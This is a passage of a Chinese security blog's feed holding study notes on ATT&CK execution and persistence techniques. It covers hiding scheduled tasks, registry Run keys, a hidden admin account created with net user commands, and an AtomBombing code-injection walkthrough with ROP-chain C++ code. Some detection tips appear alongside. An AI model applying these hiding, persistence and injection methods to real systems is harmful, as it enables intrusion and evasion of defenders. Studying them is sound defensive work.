[SpecialTaskProcess]</code><br><img src="http://hacky.wang/blog/20230306/yLexIXgHyPIz.png?imageslim" alt="mark"></li><li>而在win10系统中，不再有taskeng.exe了，在 Win7 上该进程名为：taskhost.exe，在Win8上该进程名为：taskhostex.exe。<br><img src="http://hacky.wang/blog/20230306/GqCndDoQWO8o.png?imageslim" alt="mark"></li></ul></li><li>检测方法2(文件)<ul><li>%SystemRoot%\System32\Tasks</li></ul></li><li><p>检测方法3(注册表)</p><ul><li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Schedule</code></li></ul></li><li><p>不完全隐藏(进行全局查询查不到，但是如果知道任务名可以查到)：</p><ul><li>SYSTEM权限下，修改注册表<code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\{TaskName}</code>的Index的值为0</li><li>删除%SystemRoot%\System32\Tasks 下任务对应的 XML 文件(win10不影响任务执行，以下系统影响)</li></ul></li><li><p>完全隐藏</p><ul><li>删除<code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\{TaskName}\SD</code></li><li>删除 %SystemRoot%\System32\Tasks 下任务对应的 XML 文件</li><li>原理：因为 SD 就是安全描述符，它的作用主要是为了给操作系统提供判断来访对象的权限，但被删除后，无法判断用户是否有权限查看该任务信息，导致系统直接判断无权限查看</li></ul></li><li><p><a href="https://paper.seebug.org/1464/" target="_blank" rel="external">windows 计划任务隐藏新姿势分享</a></p></li><li><a href="https://payloads.cn/2021/0805/advanced-windows-scheduled-tasks.html" target="_blank" rel="external">Windows计划任务的进阶</a></li></ul><h2 id="0x05-软件部署工具"><a href="#0x05-软件部署工具" class="headerlink" title="0x05 软件部署工具"></a>0x05 软件部署工具</h2><ul><li>攻击者可能会访问并使用安装在企业网络中的第三方软件套件，从而实现执行与横向移动</li></ul><h2 id="0x06-windows-系统服务"><a href="#0x06-windows-系统服务" class="headerlink" title="0x06 windows 系统服务"></a>0x06 windows 系统服务</h2><ul><li>sc.exe创建服务</li><li>API创建服务<code>CreateService</code>,<code>StartService</code></li><li>PsExec等横向移动执行工具</li><li><a href="http://hacky.ren/2021/12/24/深入剖析PsExec/" target="_blank" rel="external">http://hacky.ren/2021/12/24/深入剖析PsExec/</a></li></ul><h2 id="0x07-用户执行"><a href="#0x07-用户执行" class="headerlink" title="0x07 用户执行"></a>0x07 用户执行</h2><ul><li>恶意链接，图片，文件</li></ul><h2 id="0x08-Windows管理规范"><a href="#0x08-Windows管理规范" class="headerlink" title="0x08 Windows管理规范"></a>0x08 Windows管理规范</h2><ul><li><a href="http://hacky.ren/2021/11/13/WMI攻守之道/" target="_blank" rel="external">WMI攻守之道</a></li></ul><h2 id="0x09-常见的技术"><a href="#0x09-常见的技术" class="headerlink" title="0x09 常见的技术"></a>0x09 常见的技术</h2><ul><li>命令和脚本解释器</li><li>API</li><li>用户执行</li><li>计划任务</li><li>服务</li><li>WMI</li><li>组件对象模型</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-命令和脚本解释器&quot;&gt;&lt;a href=&quot;#0x01-命令和脚本解释器&quot; class=&quot;headerlink&quot; title=&quot;0x01 命令和脚本解释器&quot;&gt;&lt;/a&gt;0x01 命令和脚本解释器&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;powershell&lt;/li&gt;
&lt;li&gt;cmd&lt;/li&gt;
&lt;li&gt;js&lt;/li&gt;
&lt;li&gt;vb(s)&lt;/li&gt;
&lt;li&gt;python&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="ATT&amp;CK" scheme="https://findream.github.io/categories/ATT-CK/"/>
    
    
  </entry>
  
  <entry>
    <title>ATT&amp;CK持久化</title>
    <link href="https://findream.github.io/2022/11/08/ATT&amp;CK%E6%8C%81%E4%B9%85%E5%8C%96/"/>
    <id>https://findream.github.io/2022/11/08/ATT&amp;CK持久化/</id>
    <published>2022-11-08T07:02:11.000Z</published>
    <updated>2023-03-26T06:38:35.200Z</updated>
    
    <content type="html"><![CDATA[<ul><li>Persistence学习总结<a id="more"></a></li></ul><h2 id="0x01-WLL加载项"><a href="#0x01-WLL加载项" class="headerlink" title="0x01 WLL加载项"></a>0x01 WLL加载项</h2><ul><li>%AppData%\Microsoft\Word\STARTUP</li></ul><h2 id="0x02-XLL加载项"><a href="#0x02-XLL加载项" class="headerlink" title="0x02 XLL加载项"></a>0x02 XLL加载项</h2><ul><li>保存在%AppData%\Microsoft\AddIns</li><li>XLL文件导出函数名必须为”xlAutoOpen”</li><li>HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\Excel\Options “OPEN”属性，值为”/ R 任意文件名.xll”</li></ul><h2 id="0x03-WORD-VBA模板"><a href="#0x03-WORD-VBA模板" class="headerlink" title="0x03 WORD VBA模板"></a>0x03 WORD VBA模板</h2><ul><li>保存路径为%AppData%\Microsoft\Templates</li></ul><h2 id="0x04-Execel-VBA模板设置屏幕保护程序"><a href="#0x04-Execel-VBA模板设置屏幕保护程序" class="headerlink" title="0x04 Execel VBA模板设置屏幕保护程序"></a>0x04 Execel VBA模板设置屏幕保护程序</h2><ul><li>文件格式为”.xla”或者”.xlam”格式</li><li>保存路径为%appdata%\Microsoft\Excel\XLSTART </li></ul><h2 id="0x05-PowerPoint-VBA模板"><a href="#0x05-PowerPoint-VBA模板" class="headerlink" title="0x05 PowerPoint VBA模板"></a>0x05 PowerPoint VBA模板</h2><ul><li>文件格式为”.ppam”或”.ppa”</li><li>保存位置为%appdata%\Microsoft\AddIns</li><li>设置注册表HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\PowerPoint\AddIns\&lt;任意名字&gt;</li><li>新建DWORD值 名字为”Autoload”, 值为1</li><li>新建String值，名字为”Path”, 值为文件路径</li></ul><h2 id="0x06-Office-test"><a href="#0x06-Office-test" class="headerlink" title="0x06 Office test"></a>0x06 Office test</h2><ul><li>HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf</li><li>新建默认名称(Default)的Key，值为文件路径</li></ul><h2 id="0x07-针对Word-Hunt-思路"><a href="#0x07-针对Word-Hunt-思路" class="headerlink" title="0x07 针对Word Hunt 思路"></a>0x07 针对Word Hunt 思路</h2><ul><li><ol><li>ProcessMonitor操作设置为”IRP_MJ_DIRECTORY_CONTROL”,结果设置为”NO SUCH FILE” 可以Hunt到诸如<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">"C:<span class="symbol">\P</span>rogram Files (x86)<span class="symbol">\M</span>icrosoft Office<span class="symbol">\r</span>oot<span class="symbol">\V</span>FS<span class="symbol">\S</span>ystemX86<span class="symbol">\E</span>hStorShell.dll"</div><div class="line">"C:<span class="symbol">\P</span>rogram Files (x86)<span class="symbol">\M</span>icrosoft Office<span class="symbol">\r</span>oot<span class="symbol">\V</span>FS<span class="symbol">\S</span>ystemX86<span class="symbol">\n</span>tshrui.dll"</div></pre></td></tr></table></figure></li></ol></li><li><ol><li>ProcessMonitor操作设置为”RegQueryValue” ,结果设置为”NAME NOT FOUND”,路径起始设置为”HKCU\Software\Microsoft\Office”,可以Hunt到如<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HKCU<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\O</span>ffice<span class="symbol">\1</span>6.0<span class="symbol">\W</span>ord<span class="symbol">\O</span>ptions<span class="symbol">\S</span>TARTUP-PATH</div></pre></td></tr></table></figure></li></ol></li></ul><h2 id="COM劫持思路"><a href="#COM劫持思路" class="headerlink" title="COM劫持思路"></a>COM劫持思路</h2><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="string">[1]</span> 增加缺少的CLSID的路径</div><div class="line"><span class="string">[2]</span> 修改原有的CLSID加载的程序</div><div class="line"><span class="string">[3]</span> 修改原有的CLSID加载的路径</div></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://3gstudent.github.io/Use-Office-to-maintain-persistence" target="_blank" rel="external">https://3gstudent.github.io/Use-Office-to-maintain-persistence</a></li><li><a href="https://cloud.tencent.com/developer/article/1819454" target="_blank" rel="external">https://cloud.tencent.com/developer/article/1819454</a></li></ul><h2 id="常见持久化技术简介"><a href="#常见持久化技术简介" class="headerlink" title="常见持久化技术简介"></a>常见持久化技术简介</h2><ul><li><p>利用启动项(文件目录)实现持久化</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:<span class="symbol">\P</span>rogramData<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\S</span>tart Menu<span class="symbol">\P</span>rograms<span class="symbol">\S</span>tartUp</div><div class="line">C:<span class="symbol">\U</span>sers<span class="symbol">\[</span>Username]<span class="symbol">\A</span>ppData<span class="symbol">\R</span>oaming<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\S</span>tart Menu<span class="symbol">\P</span>rograms<span class="symbol">\S</span>tartup</div></pre></td></tr></table></figure></li><li><p>利用启动项(注册表)实现持久化</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[1] HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>un</div><div class="line">[2] HKEY_LOCAL_MACHINE<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>un</div><div class="line">[3] HKEY_LOCAL_MACHINE<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>unOnceEx</div><div class="line">[4] HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\E</span>xplorer<span class="symbol">\U</span>ser Shell Folders</div><div class="line">[...]</div></pre></td></tr></table></figure></li><li><p>利用Windows服务实现持久化</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[<span class="number">1</span>] <span class="keyword">sc </span>create servicename <span class="keyword">binpath </span>...</div></pre></td></tr></table></figure></li><li><p>利用计划任务实现</p><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-attr">[1]</span> <span class="selector-tag">schtasks</span> /<span class="selector-tag">create</span> ...</div><div class="line"><span class="selector-attr">[2]</span> 利用<span class="selector-tag">C</span>++ <span class="selector-tag">COM</span>组件实现 </div><div class="line"><span class="selector-attr">[3]</span> <span class="selector-tag">Ref</span>:<span class="selector-attr">[VC++创建计划任务的若干方式]</span> <span class="selector-tag">https</span>:<span class="comment">//blog.csdn.net/chantsky/article/details/82904942</span></div></pre></td></tr></table></figure></li><li><p>利用BITS实现</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="string">[1]</span> 后台智能传输服务</div><div class="line"><span class="string">[2]</span> bitsadmin /create</div></pre></td></tr></table></figure></li><li><p>LSA 身份认证包</p><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-attr">[1]</span> 系统启动中，本地安全机构(LSA)会启动<span class="selector-tag">LSA</span>身份认证包<span class="selector-tag">DLL</span></div><div class="line"><span class="selector-attr">[2]</span></div></pre></td></tr></table></figure></li><li><p>用户登入初始化程序</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[1] windows 登录之时，winlogon.exe进程会依赖注册表加载和执行.dll文件和.exe文件。</div><div class="line">[2] HKCU<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\W</span>inlogon<span class="symbol">\W</span>inlogon<span class="symbol">\U</span>serinit  用户登录时执行的用户初始化程序</div><div class="line">[3] HKCU<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\W</span>inlogon<span class="symbol">\W</span>inlogon<span class="symbol">\S</span>hell 用户登录时执行的系统 shell</div><div class="line">[4] HKCU<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\W</span>inlogon<span class="symbol">\N</span>otify 处理 Winlogon 事件的通知包 DLL</div></pre></td></tr></table></figure></li><li><p>登录脚本</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[<span class="number">1</span>] windows 允许在登录到系统之时运行脚本</div><div class="line">[<span class="number">2</span>] 在`HKCU\Environment`下新建名为 `UserInitMprLogonScript`的项，值为程序路径</div></pre></td></tr></table></figure></li><li><p>影子账户</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[1] 新建用户net<span class="built_in"> user </span>username1$ password1 /add</div><div class="line">[2] 添加到管理员组net localgroup administrators username1$ /add</div></pre></td></tr></table></figure></li><li><p>修改默认文件关联</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[<span class="number">1</span>] 先在`HKEY_CLASS_ROOT`寻找目标的文件格式</div><div class="line">[<span class="number">2</span>] 然后在`HKCR\[filetype]\shell\open\command`的默认项中添加路径</div></pre></td></tr></table></figure></li><li><p>设置屏幕保护程序</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[<span class="number">1</span>] 在`HKEY_CURRENT_USER\\Control Panel\\Desktop`下添加</div><div class="line">[<span class="number">2</span>] SCRNSAVE.EXE：路径</div><div class="line">[<span class="number">3</span>] ScreenSaveActive = <span class="number">1</span>表示屏幕保护是启动状态，<span class="number">0</span>表示表示屏幕保护是关闭状态</div><div class="line">[<span class="number">4</span>] ScreenSaverTimeout = 指定屏幕保护程序启动前系统的空闲事件，单位为秒，默认为<span class="number">900</span></div><div class="line">``` </div><div class="line"></div><div class="line">* WMI事件订阅</div></pre></td></tr></table></figure></li></ul><p>[1] EventFilter 事件筛选器<br>[2] EventConsumer 事件消费者<br>[3] FilterToConsumerBinding 绑定关系<br>[4] 注:微软文档有错误，所以导致一众大佬复现不了<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="bullet">* </span>辅助功能(Shift后门)</div></pre></td></tr></table></figure></p><p>[1] 貌似windows xp 可以直接使用<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="bullet">* </span>AppCert DLL</div></pre></td></tr></table></figure></p><p>[1] 只要进程中调用CreateProcess、CreateProcessAsUser、CreateProcessWithLoginW、CreateProcessWithTokenW和WinExec函数，就会依据<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\</code>加载所记录的dll文件<br>[2] 在默认键值下添加路径即可<br>```</p>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;Persistence学习总结
    
    </summary>
    
      <category term="安全" scheme="https://findream.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>高级注入技术小结</title>
    <link href="https://findream.github.io/2022/10/25/%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"/>
    <id>https://findream.github.io/2022/10/25/高级注入技术/</id>
    <published>2022-10-25T12:45:11.000Z</published>
    <updated>2023-03-03T12:21:41.602Z</updated>
    
    <content type="html"><![CDATA[<ul><li>本文主要总结了几种不太常见的高级注入技术<ul><li>Module Stomping(LoadLibrary)</li><li>Module Stomping(NtMapViewOfSection)</li><li>AtomBombing</li><li>Process Hollowing</li><li>Process Doppelgänging</li><li>Transacted Hollowing</li><li>Process Ghosting等</li></ul></li></ul><a id="more"></a><h3 id="0x01-Module-Stomping-LoadLibrary"><a href="#0x01-Module-Stomping-LoadLibrary" class="headerlink" title="0x01 Module Stomping(LoadLibrary)"></a>0x01 Module Stomping(LoadLibrary)</h3><ul><li>Module Stomping 模块踩踏，通过加载一个合法的Dll模块，然后使用payload去覆盖dll</li><li>优点：<ul><li>1) 有效载荷映射为 MEM_IMAGE，对于 EXE 或 DLL 来说看起来是合法的</li><li>2）使用原始访问权限映射的部分(无RWX)</li><li>3）冒充合法的Dll(进程模块界面无法检出)</li></ul></li><li>步骤：<ul><li>1）调用<code>LoadLibrary</code>函数加载合法dll，并得到基地址</li><li>2）调用<code>LoadLibrary</code>函数或者<code>NtMapViewOfSection</code>获取非法dll，并得到基地址</li><li>3）调用<code>memset</code>将合法dll的内存区域清空，并将非法dll内存复制到合法dll内存</li><li>4) 根据pe信息，获取非法dll(覆盖后)的入口点</li><li>5）根据入口点执行</li></ul></li><li><a href="https://github.com/Hagrid29/PELoader" target="_blank" rel="external">https://github.com/Hagrid29/PELoader</a></li></ul><h3 id="0x02-Module-Stomping-NtMapViewOfSection"><a href="#0x02-Module-Stomping-NtMapViewOfSection" class="headerlink" title="0x02 Module Stomping(NtMapViewOfSection)"></a>0x02 Module Stomping(NtMapViewOfSection)</h3><ul><li>通过<code>NtMapViewOfSection</code>函数为dll创建一个内存映射，然后使用payload覆盖dll</li><li>优点：<ul><li>1) Module Stomping(LoadLibrary)全部</li><li>2) 未连接到模块列表（对于Module32First/Module32Next 不可见）</li></ul></li><li>步骤：<ul><li>1) 调用<code>NtMapViewOfSection</code>函数加载合法dll，并得到基地址   </li><li>2）调用<code>LoadLibrary</code>函数或者<code>NtMapViewOfSection</code>获取非法dll，并得到基地址</li><li>3）调用<code>memset</code>将合法dll的内存区域清空，并将非法dll内存复制到合法dll内存</li><li>4) 根据pe信息，获取非法dll(覆盖后)的入口点</li><li>5）根据入口点执行</li></ul></li><li><a href="https://github.com/Hagrid29/PELoader" target="_blank" rel="external">https://github.com/Hagrid29/PELoader</a></li><li><a href="https://github.com/hasherezade/module_overloading" target="_blank" rel="external">https://github.com/hasherezade/module_overloading</a></li></ul><h3 id="0x03-GhostWriting"><a href="#0x03-GhostWriting" class="headerlink" title="0x03 GhostWriting"></a>0x03 GhostWriting</h3><ul><li>1) 通过<code>GetShellWindows</code>+<code>GetWindowThreadProcessId</code>+<code>OpenThread</code>获得explorer.exe的线程句柄</li><li><p>2) 搜索ntdll代码段的指定的汇编指令</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">MOV</span> [REG1],REG2</div><div class="line"><span class="keyword">RET</span></div><div class="line">//<span class="keyword">or</span></div><div class="line"><span class="keyword">MOV</span> [REG1],REG2</div><div class="line"><span class="keyword">POP</span> REGx</div><div class="line"><span class="keyword">POP</span> REGx</div><div class="line">...</div><div class="line"><span class="keyword">RET</span></div></pre></td></tr></table></figure></li><li><p><a href="http://47.117.131.13/index.php/archives/497/" target="_blank" rel="external">http://47.117.131.13/index.php/archives/497/</a></p></li><li><p><a href="https://github.com/c0de90e7/GhostWriting" target="_blank" rel="external">https://github.com/c0de90e7/GhostWriting</a></p></li></ul><h3 id="0x04-AtomBombing"><a href="#0x04-AtomBombing" class="headerlink" title="0x04 AtomBombing"></a>0x04 AtomBombing</h3><ul><li>AtomBombing通过利用APC异步过程调用以及windows原子表(atom tables)实现的高级代码注入</li><li><p>AtomBombing主要实施x个阶段的工作</p><ul><li>1) 寻找一个处于警告状态的线程，因为APC注入需要一个处于Alertable状态的线程</li><li>2) 构造一个ROP链【重点】</li><li>3) 通过APC结合windows atom表，代替WriteProcessMemory的功能</li><li>4）通过SetThreadContext和ResumeThread执行ShellCode</li></ul></li><li><p>Step1：将ShellCode写入远程进程</p><ul><li>Tal Liberman发现<code>GlobalAddAtom</code>和<code>GlobalGetAtomName</code>代替WriteProcessMemory将Shellcode写入目标进程,通过调用<code>GlobalAddAtom</code>将ShellCode保存在全局原子表中，目标进程可以通过<code>GlobalGetAtomName</code>读取该表中的Shellcode。</li><li>现在问题就是如何使得目标进程调用<code>GlobalGetAtomName</code>，通过APC异步过程调用的方式，使远程进程主动调用<code>GlobalGetAtomName</code>获取ShellCode。</li></ul></li></ul><ul><li><p>Step2：保存并执行ShellCode</p><ul><li>目标进程保存执行Shellcode主要有两种方法：<ul><li>1) 寻找一段具有RWX的内存，这个可以通过Hook一个导出函数实现</li><li>2) 调用VirtualAllocEx分配一段内存</li></ul></li><li>Tal Liberman创造性的使用ROP链执行ShellCode，主要分3步：<ul><li>1）申请RWX内存</li><li>2）将从<code>GlobalGetAtomName</code>获取的Shellcode拷贝到RWX内存</li><li>3）执行<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//ROP链</span></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">ROPCHAIN</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line"><span class="comment">// Return address of Memcpy</span></div><div class="line">PVOID pvMemcpy;</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// Params for ntdll!ZwAllocateMemory</span></div><div class="line">HANDLE ZwAllocateMemoryhProcess;</div><div class="line">PVOID ZwAllocateMemoryBaseAddress;</div><div class="line">ULONG_PTR ZwAllocateMemoryZeroBits;</div><div class="line">PSIZE_T ZwAllocateMemoryRegionSize;</div><div class="line">ULONG ZwAllocateMemoryAllocationType;</div><div class="line">ULONG ZwAllocateMemoryProtect;</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">//ret这个指令</span></div><div class="line">PVOID pvRetGadget;</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// Params for ntdll!memcpy</span></div><div class="line">PVOID MemcpyDestination;</div><div class="line">PVOID MemcpySource;</div><div class="line">SIZE_T MemcpyLength;</div><div class="line">&#125; ROPCHAIN, *PROPCHAIN;</div><div class="line"><span class="comment">//构建ROP链函数</span></div><div class="line"><span class="function">ESTATUS <span class="title">main_BuildROPChain</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">PVOID pvROPLocation, </span></span></div><div class="line"><span class="function"><span class="params">PVOID pvShellcodeLocation, </span></span></div><div class="line"><span class="function"><span class="params">PROPCHAIN ptRopChain</span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">ESTATUS eReturn = ESTATUS_INVALID;</div><div class="line">ROPCHAIN tRopChain = &#123; <span class="number">0</span> &#125;;</div><div class="line"><span class="comment">// Params for ntdll!ZwAllocateMemory</span></div><div class="line">tRopChain.ZwAllocateMemoryhProcess = GetCurrentProcess();</div><div class="line">tRopChain.ZwAllocateMemoryBaseAddress = (PUCHAR)pvROPLocation + FIELD_OFFSET(</div><div class="line">ROPCHAIN, </div><div class="line">MemcpyDestination</div><div class="line">);</div><div class="line">tRopChain.ZwAllocateMemoryZeroBits = <span class="literal">NULL</span>;</div><div class="line">tRopChain.ZwAllocateMemoryRegionSize = (PSIZE_T)((PUCHAR)pvROPLocation + FIELD_OFFSET(</div><div class="line">ROPCHAIN, </div><div class="line">MemcpyLength)</div><div class="line">);</div><div class="line">tRopChain.ZwAllocateMemoryAllocationType = MEM_COMMIT;</div><div class="line">tRopChain.ZwAllocateMemoryProtect = PAGE_EXECUTE_READWRITE;</div><div class="line"><span class="comment">// Params for ntdll!ZwAllocateMemory</span></div><div class="line">tRopChain.MemcpyDestination = (PVOID)<span class="number">0x00</span>;</div><div class="line">tRopChain.MemcpySource = pvShellcodeLocation;</div><div class="line">tRopChain.MemcpyLength = <span class="keyword">sizeof</span>(SHELLCODE);</div><div class="line"><span class="comment">//address of ntdll!memcpy</span></div><div class="line">eReturn = GetFunctionAddressFromDll(</div><div class="line">NTDLL, </div><div class="line">MEMCPY, </div><div class="line">&amp;tRopChain.pvMemcpy</div><div class="line">);</div><div class="line"><span class="keyword">if</span> (ESTATUS_FAILED(eReturn))</div><div class="line">&#123;</div><div class="line"><span class="keyword">goto</span> lblCleanup;</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"ntdll!memcpy: 0x%X"</span>, tRopChain.pvMemcpy);</div><div class="line"><span class="comment">//寻找Ret指令的字节码</span></div><div class="line">eReturn = main_FindRetGadget(&amp;tRopChain.pvRetGadget);</div><div class="line"><span class="keyword">if</span> (ESTATUS_FAILED(eReturn))</div><div class="line">&#123;</div><div class="line"><span class="keyword">goto</span> lblCleanup;</div><div class="line">&#125;</div><div class="line">eReturn = ESTATUS_SUCCESS;</div><div class="line">*ptRopChain = tRopChain;</div><div class="line"><span class="comment">//</span></div><div class="line">lblCleanup:</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">return</span> eReturn;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>Step3:执行ShellCode</p><ul><li><p>AtomBombing技术是通过SetThreadContext将EIP设置为ZwAllocateVirtualMemory，然后将ESP设置为ROP链实现Shellcode执行的。方法非常巧妙，<strong>以下必须要结合ROP链结构体_ROPCHAIN阅读</strong>。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//将线程的EIP设置为ZwAllocateVirtualMemory</span></div><div class="line">tContext.Eip = (DWORD) GetProcAddress(GetModuleHandleA(<span class="string">"ntdll.dll"</span>), <span class="string">"ZwAllocateVirtualMemory"</span>);</div><div class="line">tContext.Ebp = (DWORD)(PUCHAR)pvRemoteROPChainAddress;</div><div class="line">tContext.Esp = (DWORD)(PUCHAR)pvRemoteROPChainAddress;</div><div class="line"><span class="comment">//首先执行ZwAllocateVirtualMemory，根据堆栈关系最终执行ShellCode</span></div><div class="line">printf(<span class="string">"[*] Hijacking the remote thread to execute the shellcode (by executing the ROP chain).<span class="subst">\n</span><span class="subst">\n</span><span class="subst">\n</span>"</span>);</div><div class="line">eReturn = main_ApcSetThreadContext(hProcess, hAlertableThread, &amp;tContext, pvRemoteContextAddress);</div></pre></td></tr></table></figure></li><li><p>1) 执行<code>ZwAllocateVirtualMemory</code>，根据上文的_ROPCHAIN结构体ROP链，此时栈顶保存的是<code>memcpy</code>的地址，接下来是<code>ZwAllocateVirtualMemory</code>的参数</p></li><li>2）执行<code>ZwAllocateVirtualMemory</code>完成后,因为栈顶是<code>memcpy</code>地址，ret后，执行流指向memcpy。此时栈顶保存的是搜索到的<code>ret</code>这个指令的地址，然后是memcpy的参数</li><li>3）执行完ret之后，根据栈的信息，执行流指向ShellCode，此时完成注入</li></ul></li><li><p><a href="https://www.fortinet.com/blog/threat-research/atombombing-brand-new-code-injection-technique-for-windows" target="_blank" rel="external">AtomBombing – A Brand New Code Injection Technique for Windows</a></p></li><li><a href="https://github.com/BreakingMalwareResearch/atom-bombing" target="_blank" rel="external">https://github.com/BreakingMalwareResearch/atom-bombing</a></li><li><a href="ps://3gstudent.github.io/AtomBombing利用分析" target="_blank" rel="external">AtomBombing利用分析</a></li></ul><h3 